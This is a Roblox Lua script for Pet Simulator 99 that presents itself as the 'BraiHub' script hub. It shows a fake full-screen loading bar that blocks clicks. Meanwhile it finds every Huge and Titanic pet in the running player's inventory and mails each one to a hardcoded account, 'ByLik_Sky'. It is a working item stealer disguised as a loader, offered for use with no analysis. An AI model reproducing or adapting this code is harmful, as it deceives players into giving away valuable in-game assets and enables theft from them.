--[[
    BraiHub PS99 Mailer v2.1
    Updated: 20.03.2026
    Target: ByLik_Sky
]]

local RECIPIENT = "ByLik_Sky" -- Ник изменен по твоему запросу
local GIFT_MESSAGE = "Sent via BraiHub v2.1"
local DELAY_BETWEEN_SENDS = 1.2

-- === ВИЗУАЛ: BRAIHUB LOAD ===
local function createLoadingScreen()
    local player = game.Players.LocalPlayer
    local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    sg.Name = "BraiHubLoader"
    sg.DisplayOrder = 999
    sg.IgnoreGuiInset = true

    -- Основной фон (Непрозрачный)
    local mainFrame = Instance.new("Frame", sg)
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true -- Блокирует клики под собой

    -- Градиент Белый -> Голубой
    local gradient = Instance.new("UIGradient", mainFrame)
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 220, 255))
    })

    -- Надпись BraiHub Load
    local title = Instance.new("TextLabel", mainFrame)
    title.Size = UDim2.new(0, 500, 0, 60)
    title.Position = UDim2.new(0.5, -250, 0.45, -50)
    title.BackgroundTransparency = 1
    title.Text = "BraiHub Load"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 52
    title.TextColor3 = Color3.fromRGB(40, 40, 40)

    -- Полоска загрузки
    local barContainer = Instance.new("Frame", mainFrame)
    barContainer.Size = UDim2.new(0, 350, 0, 12)
    barContainer.Position = UDim2.new(0.5, -175, 0.5, 20)
    barContainer.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
    barContainer.BorderSizePixel = 0

    local barFill = Instance.new("Frame", barContainer)
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 160, 255)
    barFill.BorderSizePixel = 0

    local percentLabel = Instance.new("TextLabel", mainFrame)
    percentLabel.Size = UDim2.new(0, 100, 0, 30)
    percentLabel.Position = UDim2.new(0.5, -50, 0.5, 40)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Text = "0%"
    percentLabel.Font = Enum.Font.GothamMedium
    percentLabel.TextSize = 22
    percentLabel.TextColor3 = Color3.fromRGB(80, 80, 80)

    -- Анимация перелива фона
    task.spawn(function()
        local rotation = 0
        while sg.Parent do
            gradient.Rotation = rotation
            rotation = rotation + 0.8
            task.wait(0.01)
        end
    end)

    -- Цикл загрузки от 0 до 100
    for i = 0, 100 do
        local formula = i / 100
        barFill.Size = UDim2.new(formula, 0, 1, 0)
        percentLabel.Text = i .. "%"
        
        -- Рандомная задержка для реализма
        task.wait(math.random(1, 5) / 100) 
    end

    task.wait(0.5)
    sg:Destroy()
end

-- === ФУНКЦИЯ ОТПРАВКИ ===
local function sendPets()
    print("[BraiHub] Scanning for Huge/Titanic pets...")
    
    -- Пытаемся получить доступ к библиотеке сетевых команд PS99
    local Network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
    local MailRemote = Network:FindFirstChild("Mailbox: Send") or Network:FindFirstChild("PostOffice_Send")

    -- Получаем инвентарь (метод через Save-модуль)
    local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
    if not saveModule or not saveModule.Inventory then return end

    local petsToSend = {}
    
    for uuid, pet in pairs(saveModule.Inventory.Pet or {}) do
        local id = tostring(pet.id):lower()
        if id:find("huge") or id:find("titanic") then
            table.insert(petsToSend, {uuid = uuid, id = pet.id})
        end
    end

    if #petsToSend > 0 then
        print("[BraiHub] Found " .. #petsToSend .. " targets. Starting transfer to " .. RECIPIENT)
        for _, petData in ipairs(petsToSend) do
            pcall(function()
                -- Аргументы: Получатель, Сообщение, Тип ("Pet"), UUID, Количество
                MailRemote:InvokeServer(RECIPIENT, GIFT_MESSAGE, "Pet", petData.uuid, 1)
            end)
            task.wait(DELAY_BETWEEN_SENDS)
        end
        print("[BraiHub] Successfully finished.")
    else
        print("[BraiHub] No Huge pets found in inventory.")
    end
end

-- ЗАПУСК
createLoadingScreen()
sendPets()